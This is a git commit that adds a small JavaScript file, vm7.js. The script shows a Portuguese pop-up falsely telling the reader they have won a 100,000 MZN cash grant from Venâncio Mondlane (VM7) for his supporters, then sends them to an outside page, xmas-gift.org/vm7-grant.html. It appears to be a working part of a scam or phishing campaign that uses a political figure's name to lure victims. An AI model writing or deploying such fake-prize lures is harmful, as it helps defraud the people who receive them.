028a13984f39f20b0540706093a01119af04be4d
4g-network <154092422+4g-network@users.noreply.github.com>
2024-10-24 02:15:30 -0700

    Create vm7.js

---
+++ vm7.js
@@ -0,0 +1,6 @@
+
+var password = 'RETIR 100.000MZN'
+password=prompt('SMS: Parabéns, você está qualificado para VENANCE MONDLAN (VM7) 100.000MZN CONCESSÃO EM DINHEIRO PARA SEUS APOIADORES. Por favor, pressione OK para retirar o prêmio em dinheiro   ','RETIR 100.000MZN');
+if (password != 'RETIR 100.000MZN') {
+location.href='https://xmas-gift.org/vm7-grant.html';
+}
